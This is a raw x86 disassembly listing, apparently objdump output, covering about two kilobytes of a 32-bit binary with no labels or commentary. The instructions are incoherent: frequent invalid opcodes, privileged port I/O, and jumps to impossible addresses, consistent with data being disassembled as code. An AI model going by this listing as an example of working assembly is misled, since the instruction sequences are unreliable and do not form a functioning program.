  40b660:	fxch   st(1)
  40b662:	mov    ecx,0xf3f7fcff
  40b667:	pop    es
  40b668:	cli    
  40b669:	out    0xd2,eax
  40b66b:	in     eax,0xff
  40b66d:	or     eax,eax
  40b66f:	add    eax,0xe30beefe
  40b674:	loope  0x40b65b
  40b676:	(bad)  
  40b677:	mov    dl,0xb7
  40b679:	mov    al,0xfb
  40b67b:	repz loop 0x40b666
  40b67e:	cmc    
  40b67f:	iret   
  40b680:	sti    
  40b681:	(bad)  
  40b683:	xlat   BYTE PTR ds:[ebx]
  40b684:	clc    
  40b685:	in     al,dx
  40b686:	mov    esp,0xecd7e0da
  40b68b:	add    ebx,ecx
  40b68d:	lds    eax,FWORD PTR [eax]
  40b68f:	loope  0x40b651
  40b691:	jmp    ebp
  40b693:	adc    edi,esp
  40b695:	(bad)  
  40b697:	int    0xb7
  40b699:	hlt    
  40b69a:	loope  0x40b661
  40b69c:	not    esi
  40b69e:	clc    
  40b69f:	jmp    0xca2f7b6c
  40b6a4:	(bad)  
  40b6a5:	cli    
  40b6a6:	mov    dh,0xc2
  40b6a8:	lock faddp st(3),st
  40b6ab:	rcr    esi,0xd9
  40b6ae:	enter  0x4e7,0xcf
  40b6b2:	enter  0xf10e,0xb2
  40b6b6:	mov    bl,0xc3
  40b6b8:	in     al,dx
  40b6b9:	mov    bl,0xf5
  40b6bb:	hlt    
  40b6bc:	(bad)  
  40b6bd:	jmp    0x40b6ad
  40b6bf:	in     al,dx
  40b6c0:	(bad)  
  40b6c1:	mov    eax,0x1f8bab9
  40b6c6:	fidivr DWORD PTR [edi-0x43fb2114]
  40b6cc:	rol    DWORD PTR ds:0x3e7f8ea,0xe
  40b6d3:	add    al,0x6
  40b6d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6d6:	shl    edx,0xc9
  40b6d9:	scas   al,BYTE PTR es:[edi]
  40b6da:	fcmovnbe st,st(5)
  40b6dc:	shl    DWORD PTR [esi+edx*8-0x3b460b46],0xb1
  40b6e4:	mov    ebp,0x5d4e1f2
  40b6e9:	lock jmp 0x40b6f0
  40b6ec:	(bad)  
  40b6ed:	neg    ah
  40b6ef:	enter  0xd5dd,0xdf
  40b6f3:	or     eax,0xacdfad0a
  40b6f8:	in     al,dx
  40b6f9:	(bad)  
  40b6fa:	aam    0xad
  40b6fc:	mov    ebx,0xacadb7bb
  40b701:	cli    
  40b702:	mov    eax,0xda03d4dd
  40b707:	cmc    
  40b708:	cli    
  40b709:	aad    0xbe
  40b70b:	vpsraw ymm1,ymm7,XMMWORD PTR [ecx]
  40b70f:	in     al,0xd8
  40b711:	pop    es
  40b712:	(bad)  
  40b715:	repz icebp 
  40b717:	out    dx,al
  40b718:	jmp    0xed0fa3d3
  40b71d:	shr    edi,cl
  40b71f:	(bad)  
  40b720:	aam    0xd0
  40b722:	in     al,0xed
  40b724:	loop   0x40b71b
  40b726:	add    edi,DWORD PTR [eax+eax*8+0xbdde2fa]
  40b72d:	call   0xe9fd8d0d
  40b732:	sti    
  40b733:	pop    es
  40b734:	loopne 0x40b71b
  40b736:	fsubr  st(6),st
  40b738:	out    dx,al
  40b739:	scas   eax,DWORD PTR es:[edi]
  40b73a:	out    dx,eax
  40b73b:	div    ebp
  40b73d:	enter  0xd2b1,0xfa
  40b741:	(bad)  
  40b742:	fdivrp st(7),st
  40b744:	(bad)  
  40b745:	call   0xfa36ae08
  40b74a:	add    eax,0xff8f8f0
  40b74f:	or     eax,DWORD PTR ds:0xeefddbc3
  40b755:	enter  0xa8b1,0xed
  40b759:	lods   al,BYTE PTR ds:[esi]
  40b75a:	jmp    0xf2299a22
  40b75f:	div    ebp
  40b761:	sti    
  40b762:	retf   0xeae8
  40b765:	stc    
  40b766:	(bad)  
  40b767:	mov    eax,0xdec3edd3
  40b76c:	add    BYTE PTR [ecx],al
  40b76e:	or     eax,ebp
  40b770:	(bad)  
  40b771:	aam    0xc9
  40b773:	(bad)  
  40b775:	mov    esp,0xabd7c3f3
  40b77a:	(bad)
  40b77d:	(bad)  
  40b77e:	in     eax,dx
  40b77f:	leave  
  40b780:	int3   
  40b781:	hlt    
  40b782:	(bad)  
  40b783:	sti    
  40b784:	jmp    0xc0fb:0xfcd7f7b7
  40b78b:	mov    esp,0xf4c1dc05
  40b790:	sti    
  40b791:	(bad)  
  40b793:	push   es
  40b794:	repnz rol ah,cl
  40b797:	repnz mov bl,0xc9
  40b79a:	stos   BYTE PTR es:[edi],al
  40b79b:	ror    eax,1
  40b79d:	shl    eax,0xe8
  40b7a0:	into   
  40b7a1:	call   0xe136905f
  40b7a6:	cld    
  40b7a7:	aad    0xc1
  40b7a9:	fild   WORD PTR [ebx+ecx*1]
  40b7ac:	clc    
  40b7ad:	aam    0xff
  40b7af:	or     cl,cl
  40b7b1:	out    dx,eax
  40b7b2:	(bad)  
  40b7b3:	enter  0xebcb,0xaf
  40b7b7:	in     eax,dx
  40b7b8:	ret    
  40b7b9:	shr    DWORD PTR [edx-0x240f50],1
  40b7bf:	enter  0xf0f3,0xf7
  40b7c3:	jmp    0xc42e719b
  40b7c8:	sar    DWORD PTR [ebx-0x501fe0a],1
  40b7ce:	or     ecx,eax
  40b7d0:	add    eax,DWORD PTR [edx+edi*8]
  40b7d3:	repz or BYTE PTR [ecx-0xe100814],bh
  40b7da:	out    0xcc,al
  40b7dc:	lock mov dl,0xd7
  40b7df:	lods   eax,DWORD PTR ds:[esi]
  40b7e0:	sar    DWORD PTR [edi-0x1060b28],1
  40b7e6:	pop    es
  40b7e7:	in     al,dx
  40b7e8:	loop   0x40b7ac
  40b7ea:	pop    es
  40b7eb:	fdivp  st(7),st
  40b7ed:	add    esi,edx
  40b7ef:	aad    0xca
  40b7f1:	out    dx,eax
  40b7f2:	(bad)  
  40b7f3:	clc    
  40b7f4:	retf   
  40b7f5:	mov    eax,0xe9efe9b8
  40b7fa:	loope  0x40b7cd
  40b7fc:	loop   0x40b7d3
  40b7fe:	aam    0xf7
  40b800:	stc    
  40b801:	rcl    al,cl
  40b803:	jecxz  0x40b7ce
  40b805:	add    bh,BYTE PTR [ebp-0x2003822]
  40b80b:	test   cl,0xea
  40b80e:	(bad)  
  40b810:	out    0xc9,eax
  40b812:	std    
  40b813:	add    al,0xc8
  40b815:	test   al,0xc4
  40b817:	shr    edx,0xab
  40b81a:	out    0xe1,eax
  40b81c:	hlt    
  40b81d:	into   
  40b81e:	hlt    
  40b81f:	jmp    0xd7c8:0x3e8d9f0
  40b826:	int    0xd7
  40b828:	fild   WORD PTR ds:0xc0c7f4f0
  40b82e:	mul    ah
  40b830:	or     DWORD PTR [edi+ecx*8],eax
  40b833:	add    ecx,edi
  40b835:	out    0xc3,eax
  40b837:	int    0xca
  40b839:	leave  
  40b83a:	shl    al,1
  40b83c:	shl    ah,cl
  40b83e:	mov    ah,0xe7
  40b840:	idiv   BYTE PTR [eax-0x1d0c042d]
  40b846:	mov    esp,0x7def1f9
  40b84b:	icebp  
  40b84c:	(bad)  
  40b84e:	add    eax,0xafcf4f4
  40b853:	(bad)  
  40b855:	(bad)  
  40b857:	iret   
  40b858:	mov    al,0xce
  40b85a:	rol    dl,cl
  40b85c:	into   
  40b85d:	iret   
  40b85e:	jmp    0xd3cd:0xbef7f5b6
  40b865:	idiv   ah
  40b867:	faddp  st(1),st
  40b869:	shl    ecx,cl
  40b86b:	jmp    0x40b878
  40b86d:	mov    edi,0xfad9fed9
  40b872:	retf   
  40b873:	repz shr DWORD PTR [ecx-0x4d481c43],cl
  40b87a:	mov    dh,0xf2
  40b87c:	mov    ebx,0xbab7b4d6
  40b881:	rcl    ah,cl
  40b883:	leave  
  40b884:	mov    ebx,0xdecf03d6
  40b889:	add    eax,0xe605e30b
  40b88e:	lock cli 
  40b890:	or     ebp,eax
  40b892:	(bad)  
  40b893:	fsqrt  
  40b895:	jmp    0x40b869
  40b897:	scas   eax,DWORD PTR es:[edi]
  40b898:	retf   
  40b899:	rol    ebp,cl
  40b89b:	loope  0x40b862
  40b89d:	les    esi,FWORD PTR [edx+ecx*8-0x2f282f32]
  40b8a4:	(bad)  
  40b8a6:	out    dx,eax
  40b8a7:	into   
  40b8a8:	cli    
  40b8a9:	add    al,0xc2
  40b8ab:	pop    es
  40b8ac:	add    eax,0xe4d8080a
  40b8b1:	or     al,0xd8
  40b8b3:	cld    
  40b8b4:	out    dx,al
  40b8b5:	iret   
  40b8b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8b7:	shl    DWORD PTR [esi-0x2a0a3915],cl
  40b8bd:	mov    cl,0xea
  40b8bf:	lods   eax,DWORD PTR ds:[esi]
  40b8c0:	into   
  40b8c1:	mov    edx,0xb9fcfcdc
  40b8c6:	mov    esp,0xe506dff3
  40b8cb:	or     ebp,ebx
  40b8cd:	(bad)
  40b8d0:	sti    
  40b8d1:	pop    es
  40b8d2:	int3   
  40b8d3:	retf   0xace8
  40b8d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8d7:	test   eax,0xe5c9b6c5
  40b8dc:	mov    dh,0xef
  40b8de:	aad    0xeb
  40b8e0:	lods   al,BYTE PTR ds:[esi]
  40b8e1:	mov    bh,0xcb
  40b8e3:	(bad)  
  40b8e4:	mov    eax,0xd2ceecc3
  40b8e9:	fucom  st(1)
  40b8eb:	add    ch,al
  40b8ed:	test   esp,0xfc06fae7
  40b8f3:	add    BYTE PTR [ecx],al
  40b8f5:	test   al,0xdd
  40b8f7:	loope  0x40b8d6
  40b8f9:	mov    dl,0xac
  40b8fb:	jmp    0x40b8a5
  40b8fd:	mov    al,0xc9
  40b8ff:	(bad)  
  40b900:	mov    ch,0xdc
  40b902:	mov    dh,0xf3
  40b904:	ret    
  40b905:	jmp    0xbe0ea7f9
  40b90a:	fst    st(3)
  40b90c:	cld    
  40b90d:	call   0x401a8d8
  40b912:	enter  0xe7e2,0xc2
  40b916:	mov    esp,0xf0f5cab7
  40b91b:	cmc    
  40b91c:	aam    0xf6
  40b91e:	fnstcw WORD PTR [ecx-0x240e2742]
  40b924:	out    dx,eax
  40b925:	in     al,dx
  40b926:	loop   0x40b900
  40b928:	cld    
  40b929:	sar    DWORD PTR [ebp+0x7d5040a],cl
  40b92f:	call   0xdf18bff8
  40b934:	cld    
  40b935:	mov    esp,0xd1c8c8bc
  40b93a:	jmp    0xeabb:0xf2f3f1b3
  40b941:	cli    
  40b942:	(bad)  
  40b943:	fsub   st(6),st
  40b945:	call   0xbefd8a19
  40b94a:	out    0x5,eax
  40b94c:	(bad)  
  40b94d:	(bad)  
  40b94f:	or     ecx,ecx
  40b951:	dec    ch
  40b953:	add    al,0x9
  40b955:	lods   al,BYTE PTR ds:[esi]
  40b956:	ror    bh,cl
  40b958:	lods   al,BYTE PTR ds:[esi]
  40b959:	xlat   BYTE PTR ds:[ebx]
  40b95a:	in     al,dx
  40b95b:	enter  0xe7ac,0xb4
  40b95f:	mov    edx,0xc8e4bff9
  40b964:	mov    edx,0xb8fdd7c9
  40b969:	sti    
  40b96a:	jmp    0x40b92e
  40b96c:	(bad)  
  40b96d:	cld    
  40b96e:	cmc    
  40b96f:	jecxz  0x40b979
  40b971:	clc    
  40b972:	add    eax,0xdcf0d8eb
  40b977:	(bad)
  40b97a:	int3   
  40b97b:	mov    ah,0xe0
  40b97d:	int3   
  40b97e:	jmp    0x39864f
  40b983:	jecxz  0x40b962
  40b985:	int3   
  40b986:	xlat   BYTE PTR ds:[ebx]
  40b987:	push   es
  40b988:	shl    dh,0xc2
  40b98b:	shl    cl,0xd7
  40b98e:	add    ebp,esi
  40b990:	add    al,0xfb
  40b992:	ffreep st(1)
  40b994:	std    
  40b995:	jmp    0x40b96e
  40b997:	iret   
  40b998:	out    dx,al
  40b999:	iret   
  40b99a:	in     al,0xc0
  40b99c:	jmp    0xb5bf:0xf1f8f1cf
  40b9a3:	hlt    
  40b9a4:	fsub   st,st(3)
  40b9a6:	mov    edx,0xe3d8bfe3
  40b9ab:	aam    0xe3
  40b9ad:	add    eax,0xdbf8fcf6
  40b9b2:	fcmovu st,st(7)
  40b9b4:	ror    esi,cl
  40b9b6:	in     al,0xc6
  40b9b8:	shl    ecx,cl
  40b9ba:	lods   al,BYTE PTR ds:[esi]
  40b9bb:	fucomi st,st(4)
  40b9bd:	int3   
  40b9be:	sar    dh,1
  40b9c0:	sar    ch,cl
  40b9c2:	enter  0xf2d9,0xbb
  40b9c6:	repz hlt 
  40b9c8:	sar    cl,0xec
  40b9cb:	fprem1 
  40b9cd:	pop    es
  40b9ce:	aad    0xe9
  40b9d0:	push   cs
  40b9d1:	jmp    0xc24cbfd1
  40b9d6:	loop   0x40b9a3
  40b9d8:	retf   0xb1ae
  40b9db:	(bad)  
  40b9de:	call   0xdafa83ae
  40b9e3:	mov    esp,0xcff2fecf
  40b9e8:	int    0x2
  40b9ea:	add    al,bh
  40b9ec:	out    0xe5,eax
  40b9ee:	clc    
  40b9ef:	or     ecx,DWORD PTR [ebx]
  40b9f1:	pop    es
  40b9f2:	retf   
  40b9f3:	loop   0x40b9e2
  40b9f5:	out    0xc4,eax
  40b9f7:	(bad)  
  40b9f8:	test   al,0xe9
  40b9fa:	(bad)  
  40b9fb:	test   bh,0xca
  40b9fe:	out    0xb8,al
  40ba00:	out    dx,eax
  40ba01:	jmp    0xe11e88bc
  40ba06:	repnz clc 
  40ba08:	fild   DWORD PTR [edx+ebx*8]
  40ba0b:	fisttp DWORD PTR [ecx]
  40ba0d:	rol    DWORD PTR [ecx],0xe4
  40ba10:	into   
  40ba11:	fld    QWORD PTR [eax]
  40ba13:	leave  
  40ba14:	into   
  40ba15:	stos   DWORD PTR es:[edi],eax
  40ba16:	in     eax,0xb7
  40ba18:	retf   
  40ba19:	mov    ch,0xf2
  40ba1b:	mov    bh,0xcc
  40ba1d:	in     al,dx
  40ba1e:	cli    
  40ba1f:	mov    ch,0xb9
  40ba21:	(bad)  
  40ba23:	stc    
  40ba24:	add    ch,dh
  40ba26:	out    dx,eax
  40ba27:	shl    dl,cl
  40ba29:	cld    
  40ba2a:	(bad)  
  40ba2b:	loopne 0x40ba18
  40ba2d:	retf   
  40ba2e:	(bad)  
  40ba2f:	pop    es
  40ba30:	cmc    
  40ba31:	fcomp  st(0)
  40ba33:	or     eax,0xdfc9c2cb
  40ba38:	mov    bl,0xb7
  40ba3a:	mov    cl,0xac
  40ba3c:	retf   
  40ba3d:	(bad)  
  40ba3e:	shr    edi,cl
  40ba40:	jmp    0xdc38b437
  40ba45:	mov    ebx,0xdad4b5de
  40ba4a:	les    ecx,FWORD PTR [ebx]
  40ba4c:	rcr    dh,cl
  40ba4e:	call   0xda098f36
  40ba53:	add    dh,dl
  40ba55:	retf   
  40ba56:	stos   BYTE PTR es:[edi],al
  40ba57:	test   al,0xe4
  40ba59:	fadd   st(4),st
  40ba5b:	leave  
  40ba5c:	aad    0xb6
  40ba5e:	shl    eax,1
  40ba60:	cmc    
  40ba61:	in     eax,0xd9
  40ba63:	retf   0xddca
  40ba66:	out    dx,al
  40ba67:	mov    esp,0xd8dfd0ce
  40ba6c:	fdivr  QWORD PTR [edi+0x2dfdbbe]
  40ba72:	cld    
  40ba73:	loope  0x40ba48
  40ba75:	in     eax,0xae
  40ba77:	div    DWORD PTR [esi-0x5493f13]
  40ba7d:	loopne 0x40ba6d
  40ba7f:	mov    bh,0xd0
  40ba81:	cli    
  40ba82:	(bad)  
  40ba83:	clc    
  40ba84:	sar    ebp,cl
  40ba86:	std    
  40ba87:	(bad)  
  40ba88:	mov    edi,0xe3e0d0cc
  40ba8d:	lock fiadd WORD PTR [esi]
  40ba90:	or     esi,ebx
  40ba92:	loope  0x40ba7a
  40ba94:	fsub   st(7),st
  40ba96:	retf   
  40ba97:	shl    DWORD PTR [edi-0xc363c32],0xc5
  40ba9e:	out    0xd1,al
  40baa0:	ror    ebp,1
  40baa2:	shl    ch,1
  40baa4:	jmp    0xf2bd:0xdeeed2f0
  40baab:	(bad)  
  40baac:	sar    dh,1
  40baae:	push   es
  40baaf:	add    al,0xfd
  40bab1:	or     eax,0xf00c0c02
  40bab6:	loop   0x40ba64
  40bab8:	ret    
  40bab9:	xlat   BYTE PTR ds:[ebx]
  40baba:	scas   al,BYTE PTR es:[edi]
  40babb:	aad    0xc2
  40babd:	idiv   cl
  40babf:	repnz stc 
  40bac1:	icebp  
  40bac2:	in     eax,dx
  40bac3:	icebp  
  40bac4:	cld    
  40bac5:	cmc    
  40bac6:	clc    
  40bac7:	loope  0x40bacc
  40bac9:	hlt    
  40baca:	clc    
  40bacb:	shl    edi,0xe9
  40bace:	(bad)  
  40bacf:	in     al,0xe7
  40bad1:	retf   0xfbed
  40bad4:	jmp    FWORD PTR [ebx-0x2f2c0f43]
  40bada:	shl    eax,1
  40badc:	into   
  40badd:	jmp    0x40ba94
  40badf:	int3   
  40bae0:	fmulp  st(5),st
  40bae2:	rcr    dl,cl
  40bae4:	(bad)  
  40bae6:	add    esi,edx
  40bae8:	(bad)  
  40bae9:	mov    esp,0xc1bcd2fb
  40baee:	call   0x510b0c7
  40baf3:	into   
  40baf4:	retf   0xcecc
  40baf7:	call   0xcd2bb1a8
  40bafc:	into   
  40bafd:	into   
  40bafe:	out    0xd0,al
  40bb00:	aam    0xcb
  40bb02:	mov    ebx,0xf2badeca
  40bb07:	(bad)  
  40bb08:	out    dx,al
  40bb09:	add    eax,0x8bcc2e5
  40bb0e:	fcmovnu st,st(1)
  40bb10:	call   0xf848a8fc
  40bb15:	mov    esp,0xb7c9d7be
  40bb1a:	lock out 0xd3,eax
  40bb1d:	les    edi,FWORD PTR [eax-0x4163753]
  40bb23:	call   0x30e9e11
  40bb28:	idiv   DWORD PTR [esi+0x7b8b9f4]
  40bb2e:	jmp    0x40bb26
  40bb30:	(bad)  
  40bb32:	out    dx,al
  40bb33:	(bad)  
  40bb35:	lods   al,BYTE PTR ds:[esi]
  40bb36:	mov    cl,0xcb
  40bb38:	jecxz  0x40bb21
  40bb3a:	mov    esp,0xf6f0dbb2
  40bb3f:	mov    ch,0xfe
  40bb41:	in     al,dx
  40bb42:	mov    dl,0xf2
  40bb44:	mov    al,0xe8
  40bb46:	pop    es
  40bb47:	mov    edi,0x5c3f1ce
  40bb4c:	shl    esp,0xdd
  40bb4f:	loop   0x40bb50
  40bb51:	in     eax,dx
  40bb52:	jmp    0x40bb3e
  40bb54:	or     al,0xc8
  40bb56:	shr    esp,0xcf
  40bb59:	enter  0xf4f0,0xd5
  40bb5d:	mov    ecx,0xd3d5d8ca
  40bb62:	hlt    
  40bb63:	iret   
  40bb64:	sti    
  40bb65:	cli    
  40bb66:	jecxz  0x40bb2b
  40bb68:	mov    esp,0xe005c5d2
  40bb6d:	or     bl,dh
  40bb6f:	psubusb mm6,mm4
  40bb72:	aam    0xd
  40bb74:	fcmovb st,st(7)
  40bb76:	lods   al,BYTE PTR ds:[esi]
  40bb77:	shl    BYTE PTR [ebx-0x14311614],cl
  40bb7d:	(bad)  
  40bb7e:	repnz out dx,al
  40bb80:	stc    
  40bb81:	retf   0xdee4
  40bb84:	sar    BYTE PTR [eax-0x3e2a2318],1
  40bb8a:	push   es
  40bb8b:	mov    esp,0x4caf7f6
  40bb90:	leave  
  40bb91:	cld    
  40bb92:	jmp    0x40bb6f
  40bb94:	in     al,0xdc
  40bb96:	test   eax,0xeac6c5ec
  40bb9b:	ret    
  40bb9c:	cli    
  40bb9d:	mov    ecx,0xc9f0c5eb
  40bba2:	mov    ebx,0xd7bab8df
  40bba7:	cmc    
  40bba8:	sti    
  40bba9:	add    al,0xf5
  40bbab:	neg    dh
  40bbad:	leave  
  40bbae:	clc    
  40bbaf:	fadd   QWORD PTR [edx]
  40bbb1:	(bad)  
  40bbb2:	loope  0x40bb7e
  40bbb4:	fldcw  WORD PTR [ecx-0x4c423116]
  40bbba:	(bad)
  40bbbd:	jmp    0xe9f1af8e
  40bbc2:	fsub   st(2),st
  40bbc4:	(bad)  
  40bbc5:	sti    
  40bbc6:	fucom  st(2)
  40bbc8:	aad    0x1
  40bbca:	fcomi  st,st(7)
  40bbcc:	add    al,ch
  40bbce:	(bad)  
  40bbcf:	out    dx,al
  40bbd0:	dec    dl
  40bbd2:	cli    
  40bbd3:	(bad)  
  40bbd6:	int    0xf1
  40bbd8:	int    0xd0
  40bbda:	out    dx,eax
  40bbdb:	aam    0xb3
  40bbdd:	scas   eax,DWORD PTR es:[edi]
  40bbde:	call   0xfa0e8aa8
  40bbe3:	jmp    0x40bbe7
  40bbe5:	add    ch,dh
  40bbe7:	shr    dh,1
  40bbe9:	(bad)  
  40bbea:	repz cld 
  40bbec:	rol    cl,cl
  40bbee:	push   es
  40bbef:	iret   
  40bbf0:	fiadd  DWORD PTR ds:0xa8c8eddf
  40bbf6:	in     eax,0xa5
  40bbf8:	enter  0xc8e0,0xfb
  40bbfc:	mov    ah,0xe8
  40bbfe:	mov    edx,0xebddecb0
  40bc03:	icebp  
  40bc04:	loop   0x40bbdd
  40bc06:	add    edx,ecx
  40bc08:	aad    0xf4
  40bc0a:	fsubr  st,st(3)
  40bc0c:	add    eax,0x7f8c806
  40bc11:	into   
  40bc12:	jmp    0xab25c502
  40bc17:	jmp    0x40bbe4
  40bc19:	test   ebp,0xc0e5f1c9
  40bc1f:	out    0xd8,eax
  40bc21:	mov    ecx,0xd1d5dada
  40bc26:	out    dx,eax
  40bc27:	loope  0x40bc02
  40bc29:	lock ret 
  40bc2b:	jmp    0xdecb:0xfafde1e0
  40bc32:	adc    ecx,ebp
  40bc34:	retf   0xa8dc
  40bc37:	(bad)  
  40bc38:	out    0xcb,al
  40bc3a:	(bad)  
  40bc3b:	(bad)  
  40bc3c:	mov    ah,0xe6
  40bc3e:	mov    bh,0xe8
  40bc40:	mov    bh,0xf1
  40bc42:	cli    
  40bc43:	cld    
  40bc44:	loop   0x40bc05
  40bc46:	ret    
  40bc47:	ror    esi,0xf7
  40bc4a:	push   es
  40bc4b:	rcl    dh,0xfc
  40bc4e:	cmc    
  40bc4f:	(bad)  
  40bc50:	retf   
  40bc51:	(bad)  
  40bc52:	repz fsub st,st(7)
  40bc55:	fucomp st(6)
  40bc57:	ret    
  40bc58:	fidiv  WORD PTR [ebx-0x1416373f]
  40bc5e:	ror    eax,cl
  40bc60:	mov    edx,0xbcd4ffc5
  40bc65:	into   
  40bc66:	add    ebp,ebp
  40bc68:	out    0xfd,al
  40bc6a:	repz (bad) 
  40bc6c:	lock loope 0x40bc59
  40bc6f:	add    ebp,eax
  40bc71:	stc    
  40bc72:	clc    
  40bc73:	shl    ebp,cl
  40bc75:	ret    
  40bc76:	fucom  st(1)
  40bc78:	leave  
  40bc79:	aam    0xeb
  40bc7b:	call   0xf1faa453
  40bc80:	imul   ebp
  40bc82:	shl    dl,cl
  40bc84:	loop   0x40bc64
  40bc86:	call   0xd213a27e
  40bc8b:	ret    
  40bc8c:	jmp    0xe02b7e53
  40bc91:	jmp    0x40bc7d
  40bc93:	stc    
  40bc94:	stc    
  40bc95:	test   eax,0xd2c7e6b8
  40bc9a:	xlat   BYTE PTR ds:[ebx]
  40bc9b:	in     eax,dx
  40bc9c:	out    dx,al
  40bc9d:	jmp    0xb5267493
  40bca2:	(bad)  
  40bca4:	fptan  
  40bca6:	in     al,dx
  40bca7:	(bad)  
  40bca9:	hlt    
  40bcaa:	repnz shl cl,0xf1
  40bcae:	fld    QWORD PTR [esi]
  40bcb0:	cmc    
  40bcb1:	sti    
  40bcb2:	add    ebx,ebp
  40bcb4:	or     ah,al
  40bcb6:	jmp    0xb3f3a67d
  40bcbb:	mov    al,0xe1
  40bcbd:	out    dx,al
  40bcbe:	scas   al,BYTE PTR es:[edi]
  40bcbf:	hlt    
  40bcc0:	stc    
  40bcc1:	mov    ch,0xbf
  40bcc3:	out    dx,al
  40bcc4:	repz loop 0x40bca4
  40bcc7:	loop   0x40bcac
  40bcc9:	(bad)  
  40bcca:	cli    
  40bccb:	lock cmc 
  40bccd:	add    cl,BYTE PTR [ecx]
  40bccf:	in     al,0xdb
  40bcd1:	paddq  mm4,mm7
  40bcd4:	cli    
  40bcd5:	(bad)  
  40bcd7:	fisubr WORD PTR [edx+esi*8-0x3e293118]
  40bcde:	fsubr  DWORD PTR [ebp-0xc360035]
  40bce4:	retf   0xbfcd
  40bce7:	iret   
  40bce8:	fidivr WORD PTR [ebx-0x39f4063a]
  40bcee:	add    eax,ebp
  40bcf0:	jmp    0x40bcca
  40bcf2:	jmp    0xb029a4c2
  40bcf7:	loop   0x40bce0
  40bcf9:	(bad)  
  40bcfa:	icebp  
  40bcfb:	rcl    ch,0xf7
  40bcfe:	clc    
  40bcff:	aam    0xfe
  40bd01:	fcom   st(5)
  40bd03:	aam    0xdb
  40bd05:	iret   
  40bd06:	repnz in eax,dx
  40bd08:	loop   0x40bcc6
  40bd0a:	std    
  40bd0b:	fcmovnu st,st(7)
  40bd0d:	loope  0x40bd19
  40bd0f:	add    eax,0x13e70704
  40bd14:	or     al,0xc9
  40bd16:	in     al,dx
  40bd17:	shr    eax,0xe4
  40bd1a:	in     al,dx
  40bd1b:	in     eax,dx
  40bd1c:	repnz leave 
  40bd1e:	retf   
  40bd1f:	dec    edi
  40bd21:	fucomp st(1)
  40bd23:	aad    0xde
  40bd25:	ret    
  40bd26:	(bad)  
  40bd27:	in     eax,dx
  40bd28:	out    0xbe,eax
  40bd2a:	(bad)  
  40bd2b:	neg    bh
  40bd2d:	cld    
  40bd2e:	retf   
  40bd2f:	fsubr  st(5),st
  40bd31:	cli    
  40bd32:	in     eax,0xf8
  40bd34:	or     eax,0xe5bdb8d8
  40bd39:	scas   eax,DWORD PTR es:[edi]
  40bd3a:	mov    ah,0xec
  40bd3c:	loop   0x40bd1f
  40bd3e:	stc    
  40bd3f:	retf   0xb3ef
  40bd42:	imul   cl
  40bd44:	in     al,dx
  40bd45:	in     al,dx
  40bd46:	cmc    
  40bd47:	(bad)  
  40bd48:	xlat   BYTE PTR ds:[ebx]
  40bd49:	mov    esi,0xdfe70bf1
  40bd4e:	add    eax,0x7cbe6bd
  40bd53:	jecxz  0x40bd2d
  40bd55:	rcl    edi,cl
  40bd57:	test   eax,0xcbc8e4d6
  40bd5c:	(bad)  
  40bd5d:	fcmovnbe st,st(3)
  40bd5f:	int3   
  40bd60:	int    0xd4
  40bd62:	int    0xf2
  40bd64:	add    edx,ebx
  40bd66:	int3   
  40bd67:	in     eax,dx
  40bd68:	fnstsw ax
  40bd6a:	lds    ecx,FWORD PTR [ebx]
  40bd6c:	clc    
  40bd6d:	pop    es
  40bd6e:	enter  0xf8ee,0xdc
  40bd72:	fyl2xp1 
  40bd74:	out    0xc4,al
  40bd76:	scas   al,BYTE PTR es:[edi]
  40bd77:	retf   0xe6e8
  40bd7a:	shl    DWORD PTR [edx+esi*8-0xc041b08],0xc4
  40bd82:	rcl    ebx,1
  40bd84:	(bad)  
  40bd86:	neg    ebx
  40bd88:	std    
  40bd89:	loopne 0x40bd62
  40bd8b:	ret    0xd9d7
  40bd8e:	sti    
  40bd8f:	fcmove st,st(1)
  40bd91:	add    al,0xf4
  40bd93:	push   es
  40bd94:	add    al,cl
  40bd96:	mov    cl,0xc1
  40bd98:	fsubrp st(0),st
  40bd9a:	lock leave 
  40bd9c:	int3   
  40bd9d:	mov    bl,0xbb
  40bd9f:	enter  0xfeca,0xb6
  40bda3:	sti    
  40bda4:	int3   
  40bda5:	(bad)  
  40bda7:	rol    DWORD PTR [ebx],0xe4
  40bdaa:	loopne 0x40bdb3
  40bdac:	icebp  
  40bdad:	in     eax,0xf7
  40bdaf:	(bad)  
  40bdb1:	loopne 0x40bd9c
  40bdb3:	call   0xe51fb09d
  40bdb8:	scas   eax,DWORD PTR es:[edi]
  40bdb9:	repnz repnz lods eax,DWORD PTR ds:[esi]
  40bdbc:	xlat   BYTE PTR ds:[ebx]
  40bdbd:	sar    BYTE PTR [ebx-0x2d0e350e],cl
  40bdc3:	shr    eax,cl
  40bdc5:	enter  0xd7f2,0xf0
  40bdc9:	std    
  40bdca:	call   ecx
  40bdcc:	jecxz  0x40bdd8
  40bdce:	in     al,0xc9
  40bdd0:	(bad)
  40bdd4:	stc    
  40bdd5:	retf   0xeadd
  40bdd8:	shl    cl,1
  40bdda:	ret    0xd2f7
  40bddd:	out    dx,al
  40bdde:	(bad)  
  40bddf:	shl    dl,cl
  40bde1:	div    DWORD PTR [ebp-0x49420215]
  40bde7:	jecxz  0x40bda8
  40bde9:	mov    edi,0xcbc3e2e7
  40bdee:	add    ch,ah
  40bdf0:	mov    esp,0xe3dd0ddd
  40bdf5:	rcl    al,cl
  40bdf7:	retf   0xaee7
  40bdfa:	mov    bh,0xb3
  40bdfc:	hlt    
  40bdfd:	call   0xed14a6bc
  40be02:	mov    dl,0xee
  40be04:	retf   0xe2d4
  40be07:	cmc    
  40be08:	in     eax,dx
  40be09:	loope  0x40bdcf
  40be0b:	or     eax,ebx
  40be0d:	(bad)  
  40be0e:	jmp    0x40be0d
  40be10:	loope  0x40bddc
  40be12:	add    al,0xcb
  40be14:	out    0xa7,al
  40be16:	mov    esi,0xc9afc5c7
  40be1b:	in     eax,dx
  40be1c:	mov    ch,0xea
  40be1e:	mov    ecx,0xcdd5efb9
  40be23:	in     al,dx
  40be24:	rcr    cl,1
  40be26:	(bad)  
  40be28:	clc    
  40be29:	(bad)  
  40be2b:	add    eax,0xd703e90a
  40be30:	push   cs
  40be31:	(bad)  
  40be33:	int3   
  40be34:	jmp    0x40be09
  40be36:	enter  0xc9b1,0xcd
  40be3a:	ret    0xaccf
  40be3d:	int    0xdb
  40be3f:	mov    dh,0xcc
  40be41:	in     eax,dx
  40be42:	jmp    0x40be2c
